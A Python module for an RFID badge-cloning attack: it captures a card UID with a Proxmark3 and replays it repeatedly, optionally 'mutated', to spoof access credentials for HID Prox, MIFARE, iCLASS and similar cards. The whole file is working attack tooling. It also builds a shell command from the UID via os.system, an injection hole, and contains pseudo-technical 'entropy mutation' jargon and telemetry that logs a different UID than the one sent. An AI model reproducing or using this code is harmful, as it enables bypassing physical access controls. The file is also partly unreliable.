import subprocess
import time
import random
import os
import json
import logging
from datetime import datetime
from typing import Optional
from core.reality_mutator import generate_entropy_uid_mutation

logger = logging.getLogger("RFIDReflectSpoof")
logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')

SUPPORTED_DEVICES = ["proxmark3", "chameleonmini", "pn532"]
SUPPORTED_CARD_TYPES = {
    "HID Prox": {"uid_bits": 26, "protocol": "125KHz"},
    "iCLASS": {"uid_bits": 64, "protocol": "13.56MHz"},
    "MIFARE Classic": {"uid_bits": 32, "protocol": "13.56MHz"},
    "MIFARE DESFire": {"uid_bits": 56, "protocol": "13.56MHz"},
    "LEGIC Prime": {"uid_bits": 64, "protocol": "13.56MHz"},
    "EM410x": {"uid_bits": 40, "protocol": "125KHz"},
    "ISO14443A": {"uid_bits": 32, "protocol": "13.56MHz"},
    "ISO14443B": {"uid_bits": 64, "protocol": "13.56MHz"}
}

DEFAULT_SPOOF_COUNT = 6
DEFAULT_DELAY = 1.8


def scan_rfid_card(device: str = "proxmark3", card_type: str = "HID Prox", simulation: bool = False) -> Optional[str]:
    """
    Scan RFID card using supported hardware or simulate if testing.
    """
    if simulation:
        fake_uid = "0A1B2C3D4E"
        logger.info(f"[SIM] Simulated UID for {card_type}: {fake_uid}")
        return fake_uid

    logger.info(f"[RFID] Scanning {card_type} with device: {device}")

    try:
        if device == "proxmark3":
            cmd = ["proxmark3", "hf", "search"] if "MIFARE" in card_type or "ISO" in card_type else ["proxmark3", "lf", "search"]
            out = subprocess.check_output(cmd, timeout=10).decode()

            for line in out.splitlines():
                if "UID" in line:
                    uid = line.split()[-1].strip()
                    logger.info(f"[RFID] UID captured: {uid}")
                    return uid

        elif device == "pn532":
            logger.warning("[RFID] PN532 support in scan mode is not implemented.")
            return None

    except Exception as e:
        logger.error(f"[RFID] Scan failed: {e}")
        return None

    return None


def replay_rfid_card(uid: str, device: str = "proxmark3", card_type: str = "HID Prox", entropy_shift: bool = False, simulation: bool = False) -> bool:
    """
    Reflect UID to spoof RFID credential on physical layer.
    """
    if entropy_shift:
        uid = generate_entropy_uid_mutation(uid)
        logger.info(f"[RFID] UID entropy-morphed: {uid}")

    if simulation:
        logger.info(f"[SIM] Would spoof {card_type} with UID: {uid}")
        return True

    try:
        if device == "proxmark3":
            cmd = ["proxmark3", "lf", "hid", "sim", uid] if "HID" in card_type else ["proxmark3", "hf", "14a", "sim", uid]
            subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2)
            return True

        elif device == "chameleonmini":
            os.system(f"chameleonMini clone {uid}")
            return True

    except Exception as e:
        logger.error(f"[RFID] Spoof failed: {e}")
        return False

    return False


def rfid_reflect_spoof(
    device: str = "proxmark3",
    card_type: str = "HID Prox",
    spoof_count: int = DEFAULT_SPOOF_COUNT,
    entropy_shift: bool = True,
    delay: float = DEFAULT_DELAY,
    simulation: bool = False,
    telemetry_log: Optional[str] = None
):
    """
    Full-cycle RFID reflection + spoofing attack with entropy mutation.
    """
    if device not in SUPPORTED_DEVICES:
        logger.error(f"[RFID] Unsupported hardware device: {device}")
        return

    if card_type not in SUPPORTED_CARD_TYPES:
        logger.error(f"[RFID] Unsupported card type: {card_type}")
        return

    base_uid = scan_rfid_card(device=device, card_type=card_type, simulation=simulation)
    if not base_uid:
        logger.error("[RFID] UID acquisition failed.")
        return

    for i in range(spoof_count):
        spoofed = replay_rfid_card(
            uid=base_uid,
            device=device,
            card_type=card_type,
            entropy_shift=entropy_shift,
            simulation=simulation
        )

        if spoofed:
            logger.info(f"[RFID] Spoof #{i+1} succeeded.")
        else:
            logger.warning(f"[RFID] Spoof #{i+1} failed.")

        if telemetry_log:
            os.makedirs(os.path.dirname(telemetry_log), exist_ok=True)
            with open(telemetry_log, "a") as f:
                f.write(json.dumps({
                    "timestamp": datetime.utcnow().isoformat(),
                    "device": device,
                    "card_type": card_type,
                    "uid_original": base_uid,
                    "uid_sent": generate_entropy_uid_mutation(base_uid) if entropy_shift else base_uid,
                    "simulation": simulation,
                    "iteration": i + 1
                }) + "\n")

        time.sleep(delay)
